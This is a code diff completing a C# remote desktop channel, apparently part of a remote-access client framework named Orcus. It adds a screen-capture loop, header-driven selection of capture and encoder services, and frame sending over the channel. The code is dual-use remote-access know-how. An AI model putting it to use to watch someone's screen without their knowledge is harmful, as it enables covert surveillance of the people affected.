@@ -1,6 +1,7 @@
 ﻿using System;
-using System.Collections;
+using System.Buffers;
 using System.Collections.Generic;
+using System.Linq;
 using System.Threading.Tasks;
 using Microsoft.Net.Http.Headers;
 using Orcus.Modules.Api;
@@ -8,30 +9,35 @@ using Orcus.Modules.Api.Routing;
 using Orcus.Utilities;
 using RemoteDesktop.Client.Capture;
 using RemoteDesktop.Client.Encoder;
+using RemoteDesktop.Shared;
 
 namespace RemoteDesktop.Client.Channels
 {
-    public class RemoteDesktopChannel : OrcusChannel
+    [Route("screen")]
+    public class RemoteDesktopChannel : OrcusChannel, IFrameTransmitter
     {
+        private bool _isDisposed;
+        private bool _isCapturing;
+        private readonly object _captureLock = new object();
+
         private readonly IEnumerable<IScreenCaptureService> _captureServices;
         private readonly IEnumerable<IStreamEncoder> _streamEncoders;
-        private bool _isDisposed;
 
         private IStreamEncoder _streamEncoder;
-        private IScreenCaptureService captureService;
+        private IScreenCaptureService _captureService;
 
         public RemoteDesktopChannel(IEnumerable<IScreenCaptureService> captureServices, IEnumerable<IStreamEncoder> streamEncoder)
         {
             _captureServices = captureServices;
-            _streamEncoder = streamEncoder;
+            _streamEncoders = streamEncoder;
         }
 
         public override void ReceiveData(byte[] buffer, int offset, int count)
         {
-            throw new NotImplementedException();
+            throw new NotSupportedException();
         }
 
-        [OrcusPost]
+        [OrcusGet("start")]
         public IActionResult InitializeRemoteDesktop()
         {
             Task.Run(CaptureLoop).Forget(); //not long running
@@ -40,9 +46,21 @@ namespace RemoteDesktop.Client.Channels
 
         public void CaptureLoop()
         {
-            using (var )
+            lock (_captureLock)
             {
-                
+                if (_isCapturing)
+                    throw new InvalidOperationException("The channel only allows one capture process");
+
+                _isCapturing = true;
+            }
+
+            using (var captureService = _captureService)
+            using (var streamEncoder = _streamEncoder)
+            {
+                while (!_isDisposed)
+                {
+                    captureService.Capture(streamEncoder);
+                }
             }
         }
 
@@ -50,15 +68,61 @@ namespace RemoteDesktop.Client.Channels
         {
             base.Initialize();
             var captureCommandLine = OrcusContext.Request.Headers["capture"];
-            var encoderCommandLine = OrcusContext.Request.Headers[HeaderNames.ContentEncoding];
+            var encoderCommandLine = OrcusContext.Request.Headers[HeaderNames.AcceptEncoding];
 
-            _streamEncoder.
+            var captureOptions = ComponentOptions.Parse(captureCommandLine);
+            var encoderOptions = ComponentOptions.Parse(encoderCommandLine);
+
+            _captureService = ResolveService(captureOptions, _captureServices);
+            _streamEncoder = ResolveService(encoderOptions, _streamEncoders);
+
+            var screenInfo = _captureService.Initialize(captureOptions);
+            _streamEncoder.Initialize(screenInfo, this, encoderOptions);
+        }
+
+        private static T ResolveService<T>(ComponentOptions options, IEnumerable<T> services) where T : IScreenComponent
+        {
+            var service = services.FirstOrDefault(x => x.Id == options.ComponentName);
+            if (service?.IsPlatformSupported != true)
+            {
+                service = services.FirstOrDefault(x => x.IsPlatformSupported);
+                if (service == null)
+                    throw new InvalidOperationException($"No available service found for {typeof(T).Name}");
+            }
+
+            return service;
         }
 
         public override void Dispose()
         {
             base.Dispose();
             _isDisposed = true;
+
+            lock (_captureLock)
+            {
+                if (!_isCapturing)
+                {
+                    _captureService?.Dispose();
+                    _streamEncoder?.Dispose();
+                    _isCapturing = true; //block start
+                }
+            }
+        }
+
+        public ArraySegment<byte> AllocateBuffer(int length)
+        {
+            var buffer = ArrayPool<byte>.Shared.Rent(length + RequiredOffset);
+            return new ArraySegment<byte>(buffer, RequiredOffset, length);
+        }
+
+        public void ReleaseSendBuffer(ArraySegment<byte> buffer)
+        {
+            ArrayPool<byte>.Shared.Return(buffer.Array);
+        }
+
+        public void SendFrame(ArraySegment<byte> sendBuffer)
+        {
+            Send(sendBuffer.Array, sendBuffer.Offset, sendBuffer.Count, hasOffset: true).Wait();
         }
     }
 }
